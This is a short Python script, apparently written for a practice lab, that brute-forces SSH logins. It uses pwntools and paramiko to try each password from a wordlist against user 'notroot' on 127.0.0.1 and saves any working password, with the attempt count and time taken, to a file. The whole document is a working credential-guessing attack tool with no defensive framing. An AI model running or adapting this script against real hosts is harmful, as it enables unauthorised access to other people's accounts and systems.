from pwn import *
import paramiko
import time

host = "127.0.0.1"
username = "notroot"
attemps = 0
start_time = time.time()

with open('best110.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] attempting password: [{}]".format(attemps, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                end_time = time.time()
                print("[>] Valid password found: [{}]".format(password))
                print("[{}] attempts".format(attemps))
                print("[{:.2f}] Time taken".format(end_time - start_time))
                with open("found.txt", "w") as file:
                    file.write("Password found: [{}]\n".format(password))
                    file.write("Attempts: [{}]\n".format(attemps))
                    file.write("Time: [{:.2f}]\n".format(end_time - start_time))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password")
        attemps += 1